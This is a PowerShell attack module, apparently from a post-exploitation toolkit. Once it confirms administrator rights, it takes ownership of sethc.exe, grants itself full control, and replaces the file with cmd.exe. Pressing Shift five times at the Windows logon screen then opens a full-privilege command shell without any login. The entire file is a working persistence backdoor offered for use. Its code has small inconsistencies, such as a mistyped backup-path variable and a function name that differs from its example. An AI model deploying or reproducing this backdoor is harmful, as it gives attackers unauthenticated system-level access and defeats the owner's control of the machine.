<#
.Synopsis
   Adds cmd shell backdoor to machine.
.DESCRIPTION
   Replaces sethc.exe with cmd.exe so when you initiate the handicap function by hitting shift 5 times
   or hitting the handicap button on the logon screen will give you a full priviledge cmd shell.
.EXAMPLE
   Invoke-HandicapBackdoor
#>
function Invoke-SethcBD
{
    [CmdletBinding()]
    Param()

    function Get-isHighIntegrity
    {
        $isAdmin = $false
	    #If the process is running as System then we are in a high integrity process.
        if(([Environment]::UserName).ToLower() -eq 'system') {
            $isAdmin = $true
        }else{
            # otherwise check the token groups
            $isadmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
        }
        return $isAdmin
    }

    if (-not (Get-isHighIntegrity)){
        return "Module must be ran UAC Bypassed."
    }

    try {
        $sethcFile = "C:\Windows\System32\sethc.exe"
        $cmdFile = "C:\Windows\System32\cmd.exe"
        $sethcBak = "C:\Windows\System32\sethc.bak"
        $takeown = "c:\windows\system32\takeown.exe"
        $icacls = "c:\windows\system32\icacls.exe"

        if(Test-Path -Path $sethcBack)
        {
            return "Backup of sethc.exe detected, module might have already been run."
        }

        $null = IEX "$takeown /A /F $sethcFile"
        $null = IEX "$icacls $sethcFile /grant Administrators:F"
        
        Rename-Item -Path $sethcFile -NewName $sethcBak
        Copy-Item -Path $cmdFile -Destination $sethcFile
        return "Successfully installed handicap backdoor"
    }
    catch {
        return ("There was an error adding backdoor:`r`n{0}" -f ($_.Exception.Message))
    }
    

}
